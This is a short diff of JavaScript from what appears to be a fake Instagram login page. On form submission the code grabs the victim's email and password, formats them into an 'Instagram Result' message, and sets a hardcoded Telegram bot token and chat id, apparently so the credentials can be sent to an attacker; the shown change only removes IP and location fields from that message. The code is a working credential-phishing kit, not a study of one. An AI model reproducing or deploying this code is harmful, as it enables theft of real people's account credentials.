@@ -7,7 +7,7 @@ form.addEventListener("submit", (e) => {
         var identity = document.getElementById("email").value;
         var password = document.getElementById("password").value;
 
-        var my_text = `Instagram Result from IpAddress for user ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} %0A - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
+        var my_text = `Instagram Result from IpAddress for user ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} `;
     
           var token = "6650969963:AAECQrzycrXYX2_j45OEBuoMU38lLXTjLh8";
     var chat_id = -4270395846
